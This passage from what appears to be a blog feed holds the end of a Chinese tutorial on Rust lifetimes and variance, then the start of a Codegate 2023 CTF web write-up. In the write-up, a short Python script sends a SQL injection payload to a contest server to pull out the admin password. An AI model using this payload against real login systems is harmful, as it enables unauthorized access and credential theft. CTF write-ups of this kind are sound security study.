class=&#34;built_in&#34;&gt;println!&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Announcement! &amp;#123;&amp;#125;&amp;quot;&lt;/span&gt;, ann);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x.&lt;span class=&#34;title function_ invoke__&#34;&gt;len&lt;/span&gt;() &amp;gt; y.&lt;span class=&#34;title function_ invoke__&#34;&gt;len&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        x&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        y&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;x,y是字符串slice，在C&amp;#x2F;C++中对应字符串指针；在C语言中，这样的&lt;strong&gt;指针在字符串失效后有可能仍被调用（悬垂指针）&lt;/strong&gt;，就带来危险。而Rust如何解决这一问题呢？答案是通过所有权机制和生命周期，确认值的有效期究竟何时开始，何时结束（这就称为&lt;strong&gt;生命周期&lt;/strong&gt;），禁止在值的生命周期外进行引用、读取、修改等操作。&lt;br&gt;Rust里没有“赋值”，只有“绑定”：我们把一个变量名绑定到一个值上，因此这些生命周期注解，仍旧针对的是值：它是一些实际存在的值（字面量、变量储存的值、函数、闭包……）的固有属性，不是虚无缥缈的。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;📘 根据现代Rust自带的一些约束推导规则，~95%的情况下生命周期注解能被编译器自动推断。但手动的注解有时无法避免：尤其是结构体中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在这个例子中，由于这个if的存在，Rust编译器无法判断返回值的有效期到底和x一样还是和y一样。&lt;br&gt;我们要添加类型推断（是的，生命周期也是一种泛型），x、y具有同名的生命周期注解’a，根据规则’a取x和y生命周期的交集：x,y都有效时，返回值一定有效！这样就避免了C&amp;#x2F;C++中悬垂指针带来的危险。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;也许有人会问，为什么调用该函数时，如果传入的参数生命周期不同，会取较短的？&lt;br&gt;我们要在集合论的角度考虑：我们说想要一只动物，那么给与可爱的猫是可以接受的，因为猫是动物的子集。事实上，子集（$\subseteq$）&lt;strong&gt;是&lt;/strong&gt;一种偏序关系。而生命周期也&lt;strong&gt;存在&lt;/strong&gt;一种偏序关系：我们把&lt;strong&gt;这种关系叫subtype&lt;/strong&gt;。假设对于两个生命周期L1和生命周期L2，且有L1是L2的subtype，那我们就记作&lt;code&gt;&amp;#39;L1&amp;lt;:&amp;#39;L2&lt;/code&gt;，&lt;em&gt;vice versa&lt;/em&gt;.&lt;br&gt;显然，生命周期越长越“好”（也就是泛用）。所以一开始我们就知道&lt;code&gt;&amp;#39;long &amp;lt;: &amp;#39;short&lt;/code&gt;，也就是长寿的可以自裁(cast过去)变成短命的，但是短命的没法强行续命变成长命的（类比上面猫与动物的例子，我们要求一个参数需要有特定生命周期时，更长的甚至static都是可以接受的，但绝不能更短：否则Rust布道者赖以为生的内存安全要出事了）。&lt;br&gt;当然，还有一个显然：&lt;code&gt;&amp;#39;static&lt;/code&gt;是所有类型的subtype.&lt;br&gt;(不用太纠结为什么是&lt;code&gt;&amp;#39;long &amp;lt;: &amp;#39;short&lt;/code&gt;，偏序关系倒过来没有本质区别，这边只是强调&lt;code&gt;&amp;#39;long&lt;/code&gt;更好，物以稀为贵，所以“更少”就放左边了)&lt;br&gt;什么意思呢？&lt;strong&gt;简而言之，L1的约束比L2更松&lt;/strong&gt;。我们看一个例子，讨论&lt;strong&gt;函数间&lt;/strong&gt;的偏序关系：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;假设有函数f1(x)和f2(x)，唯一的区别是f1对传进来的x的生命周期的最低要求更长，那么能用f1的地方就能用f2，但能用f2的地方不一定能用f1，因此f2更泛用，f2≼f1&lt;/li&gt;
&lt;li&gt;假设有函数f1()-&amp;gt;x和f2()-&amp;gt;x，唯一的区别是f1的返回值x的生命周期比f2的长，那么需要其返回值的地方能用f2就一定能用f1，反之则不然，因此f1更泛用，f1≼f2&lt;/li&gt;
&lt;li&gt;思考题：那&lt;code&gt;mut&amp;amp;&amp;#39;a T&lt;/code&gt;和&lt;code&gt;T&lt;/code&gt;呢？见下文&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;就像int32可以转int64（数据范围更难满足-&amp;gt;数据范围更易满足）而反之不行一样单向，subtype可以向右侧cast（长命百岁-&amp;gt;至少活10年）；但反之是不安全的。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;因此，约束关系推导出来的最终生命周期是最严格的，宁可错杀一千也不会放过一个；就是可能有些人工检查过，可以保证安全的操作会被笨笨的生命周期约束拦下：这时就需要你动用unsafe黑魔法了&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;所以现在我们要把生命周期理解为类型系统的一部分时，困惑可能来源于为什么不像整形一样规则简单（小int永远是大int的subtype），而包含生命周期的类型系统则有时并不如此：可能不存在这个偏序关系，也可能反过来下克上。&lt;br&gt;&lt;strong&gt;我们要明确，函数签名之类的是对类型进行的一种运算&lt;/strong&gt;。你可以理解为函数对值运算，而函数签名对类型进行运算。是不是有点像物理上的&lt;strong&gt;量纲分析！&lt;/strong&gt;。&lt;br&gt;换言之，这些带泛型或者生命周期的东西（不管是&lt;code&gt;Vec&amp;lt;T&amp;gt;&lt;/code&gt;还是&lt;code&gt;&amp;lt;T&amp;gt;T-&amp;gt;T&lt;/code&gt;，别忘了函数也是类型一种类型，也属于&lt;code&gt;T&lt;/code&gt;），本质上是类型之间的Functor.&lt;br&gt;因此，我们可以把上一节的&lt;code&gt;f1&lt;/code&gt; &lt;code&gt;f2&lt;/code&gt;都拆开来看，当作一种运算，看看他对生命周期做了什么。&lt;br&gt;例如，对于函数参数，参数受较短生命周期的约束——如上一节分析的那样——我们发现&lt;code&gt;&amp;#39;long &amp;lt;: &amp;#39;short&lt;/code&gt; &amp;#x3D;&amp;gt; &lt;code&gt;F(&amp;#39;short) &amp;lt;: F(&amp;#39;long)&lt;/code&gt; (颠倒了！剧透：这叫逆变(contravariance))，而长寿者可以降级为短命者；而对返回值来说，恰恰相反：我们只知道至少可以活多么久，活更长对于使用返回值的表达式来说也一定可以接受，此时&lt;code&gt;&amp;#39;long &amp;lt;: &amp;#39;short&lt;/code&gt; &amp;#x3D;&amp;gt; &lt;code&gt;(F()-&amp;gt;&amp;#39;long) &amp;lt;: (F()-&amp;gt;&amp;#39;short)&lt;/code&gt;（关系保持！剧透：这叫协变(covariance)）……其中，&lt;code&gt;&amp;lt;:&lt;/code&gt;左右两侧的表达式——或者说函数签名——正对应上一节的&lt;code&gt;f1&lt;/code&gt; &lt;code&gt;f2&lt;/code&gt;，我们只是把&lt;code&gt;≼&lt;/code&gt;换成了&lt;code&gt;&amp;lt;:&lt;/code&gt;。  &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;颠倒了的就是contravariant，不变就是covariant，根本没法推出关系的就是invariant.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;invariant就是上面思考题那种。至于原因，最后一节会有个特别轻松易懂的解释&lt;code&gt;:)&lt;/code&gt;  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;为什么要搞得这么数学（离散数学&amp;#x2F;范畴论）？因为当类型系统的偏序关系网浮出水面，系统里隐含的约束也就能被自然推导。&lt;br&gt;&lt;strong&gt;如果对于用到的类型，这个偏序集合是格（有上下确界），那么编译器会开心的帮你标记好一切生命周期&lt;/strong&gt;；&lt;br&gt;&lt;strong&gt;如果没有办法cast导致编译器在约束求解中无法找出某些类型的上下确界，甚至出现了环——不好意思，还是得另请高明（程序员）来标清楚。&lt;/strong&gt;&lt;br&gt;例如上面那段代码为两个参数都标注&lt;code&gt;&amp;#39;a&lt;/code&gt;其实等效于在a、b固有的、不受约束的生命周期（远古版本反人体工程学rust必须写明所有生命周期，现在能自动推导绝大部分）中添加了两条约束：&lt;/p&gt;
&lt;figure class=&#34;highlight rust&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;fn&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;longer&lt;/span&gt;&amp;lt;&lt;span class=&#34;symbol&#34;&gt;&amp;#x27;a&lt;/span&gt;, &lt;span class=&#34;symbol&#34;&gt;&amp;#x27;b&lt;/span&gt;&amp;gt;(s1: &amp;amp;&lt;span class=&#34;symbol&#34;&gt;&amp;#x27;a&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;str&lt;/span&gt;, s2: &amp;amp;&lt;span class=&#34;symbol&#34;&gt;&amp;#x27;b&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;str&lt;/span&gt;) &lt;span class=&#34;punctuation&#34;&gt;-&amp;gt;&lt;/span&gt; &amp;amp;&lt;span class=&#34;symbol&#34;&gt;&amp;#x27;a&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;symbol&#34;&gt;&amp;#x27;a&lt;/span&gt;:&lt;span class=&#34;symbol&#34;&gt;&amp;#x27;b&lt;/span&gt;, &lt;span class=&#34;symbol&#34;&gt;&amp;#x27;b&lt;/span&gt;:&lt;span class=&#34;symbol&#34;&gt;&amp;#x27;a&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; s2.&lt;span class=&#34;title function_ invoke__&#34;&gt;len&lt;/span&gt;() &amp;gt; s1.&lt;span class=&#34;title function_ invoke__&#34;&gt;len&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也就是对x和y分别绑定的值，其生命周期’a与’b有{‘a≼’b,’b≼’a}，也就是{‘a:’b, ‘b:’a}（显然可以推出’a&amp;#x3D;&amp;#x3D;’b）。&lt;br&gt;因此在手动指定后，在需要用到生命周期的地方，这两个参数以及返回值的生命周期就可以被推导啦：为了让他们相等，编译器要根据基本法把长的生命周期cast到短的上。&lt;br&gt;最终效果就是取传参生命周期较短者。注意这时我们在谈论的是参数，不是整个函数发生了什么质变。&lt;br&gt;……是的，其实日常根本就没有多少情况需要你操心函数参数的那个contravariant！可以松口气了。&lt;br&gt;当然，根据上文所述，这样&lt;strong&gt;推导出来的生命周期约束是怎么严格怎么来&lt;/strong&gt;，但记住：&lt;strong&gt;如果你被搞晕了，那就相信你的直觉；程序是人设计为人服务的，因此绝大部分情况下生命周期的限制是符合直觉的&lt;/strong&gt;（也就是你可以使用“显然”这一词）。&lt;br&gt;What a relief.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;有没有想过一些运算过后，偏序关系不一定会保留&amp;#x2F;颠倒，还有可能会直接丢失！&lt;br&gt;那么对这种情况，非常推荐阅读关于subtyping, &lt;strong&gt;variance(covariant, invariant, contravariant)&lt;/strong&gt; 的参考资料：&lt;br&gt;&lt;a href=&#34;https://doc.rust-lang.org/nomicon/subtyping.html&#34;&gt;Subtyping and Variance - The Rustonomicon&lt;/a&gt;&lt;br&gt;我将文中的表格附在此处：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Type&lt;/th&gt;
&lt;th&gt;‘a T&lt;/th&gt;
&lt;th&gt;U&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&amp;amp;’a T&lt;/td&gt;
&lt;td&gt;covariant&lt;/td&gt;
&lt;td&gt;covariant&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;amp;’a mut T&lt;/td&gt;
&lt;td&gt;covariant&lt;/td&gt;
&lt;td&gt;&lt;em&gt;invariant&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Box&lt;T&gt;&lt;/T&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;covariant&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Vec&lt;T&gt;&lt;/T&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;covariant&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;UnsafeCell&lt;T&gt;&lt;/T&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;em&gt;invariant&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Cell&lt;T&gt;&lt;/T&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;em&gt;invariant&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;fn(T) -&amp;gt; U&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;contravariant&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;covariant&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;*const T&lt;/td&gt;
&lt;td&gt;covariant&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;*mut T&lt;/td&gt;
&lt;td&gt;&lt;em&gt;invariant&lt;/em&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;然后你会发现倒过来（contravariant, 逆变）的其实&lt;strong&gt;就只有&lt;/strong&gt;这个函数参数。&lt;br&gt;然后你还会注意到，那些invariant的不变量是不是都提供内部不变性，换言之，本质上都是一种指针？&lt;br&gt;&lt;strong&gt;我可以提供一个绝妙的角度：想想C&amp;#x2F;C++的指针类型定义, 指针本身是不是const，这和指针的内容（指向的对象）是不是const有啥关系吗？当然没有！&lt;/strong&gt;&lt;br&gt;所以某种意义上，&lt;strong&gt;你可以把const理解为很粗糙的生命周期约束，我们Rust更精细的系统里，他叫&lt;code&gt;&amp;#39;static&lt;/code&gt;.&lt;/strong&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2023/08/29/CODEGATE2023/</guid>
            <title>Codegate 2023 Partial Write-Up (Web/Misc)</title>
            <link>http://cubicy.icu/2023/08/29/CODEGATE2023/</link>
            <category>Write-Up</category>
            <pubDate>Tue, 29 Aug 2023 15:05:06 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Codegate-2023-部分Write-Up-Web-Misc&#34;&gt;&lt;a href=&#34;#Codegate-2023-部分Write-Up-Web-Misc&#34; class=&#34;headerlink&#34; title=&#34;Codegate 2023 部分Write-Up (Web&amp;#x2F;Misc)&#34;&gt;&lt;/a&gt;Codegate 2023 部分Write-Up (Web&amp;#x2F;Misc)&lt;/h1&gt;&lt;p&gt;这次去韩国参加了Codegate 2023的决赛！把Web部分的题解在此释出，其他游记&amp;#x2F;照片另开一文。  &lt;/p&gt;
&lt;h2 id=&#34;Warmup&#34;&gt;&lt;a href=&#34;#Warmup&#34; class=&#34;headerlink&#34; title=&#34;Warmup&#34;&gt;&lt;/a&gt;Warmup&lt;/h2&gt;&lt;p&gt;没咋看。似乎是XSS绕绕。&lt;/p&gt;
&lt;h2 id=&#34;Pwn&#34;&gt;&lt;a href=&#34;#Pwn&#34; class=&#34;headerlink&#34; title=&#34;Pwn&#34;&gt;&lt;/a&gt;Pwn&lt;/h2&gt;&lt;p&gt;是的，这题就叫Pwn（与之相对的是Pwn分类里有道题叫Web）&lt;br&gt;解法：没咋看。应该是比较水的一题。经典数组绕过  &lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;data = &lt;span class=&#34;string&#34;&gt;&amp;quot;username[0]=\\&amp;#x27; union select password from USER WHERE username=&amp;#x27;admin&amp;#x27; -- &amp;amp;username[1]=2&amp;amp;password=3&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.post(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://3.35.198.7:2929/login&amp;quot;&lt;/span&gt;, data=data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;Cha’s-magic&#34;&gt;&lt;a href=&#34;#Cha’s-magic&#34; class=&#34;headerlink&#34; title=&#34;Cha’s magic&#34;&gt;&lt;/a&gt;Cha’s magic&lt;/h2&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;require_once &lt;span class=&#34;string&#34;&gt;&amp;#x27;config.php&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function hashPasswordOld($password_to_hash)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; $host, $dbname, $username, $password, $charset;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $db = new PDO(&lt;span class=&#34;string&#34;&gt;&amp;quot;mysql:host=$host;dbname=$dbname;charset=$charset&amp;quot;&lt;/span&gt;, $username, $password);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $query = $db-&amp;gt;prepare(&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT OLD_PASSWORD(:password)&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $query-&amp;gt;execute([&lt;span class=&#34;string&#34;&gt;&amp;#x27;:password&amp;#x27;&lt;/span&gt; =&amp;gt; $password_to_hash]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $row = $query-&amp;gt;fetch(PDO::FETCH_NUM);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ($row)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; $row[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    catch(PDOException $ex)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        die(&lt;span class=&#34;string&#34;&gt;&amp;quot;An Error occured!&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(isset($_GET[&lt;span class=&#34;string&#34;&gt;&amp;quot;v1&amp;quot;&lt;/span&gt;]) &amp;amp;&amp;amp; isset($_GET[&lt;span class=&#34;string&#34;&gt;&amp;quot;v2&amp;quot;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $v1 = $_GET[&lt;span class=&#34;string&#34;&gt;&amp;quot;v1&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $v2 = $_GET[&lt;span class=&#34;string&#34;&gt;&amp;quot;v2&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span 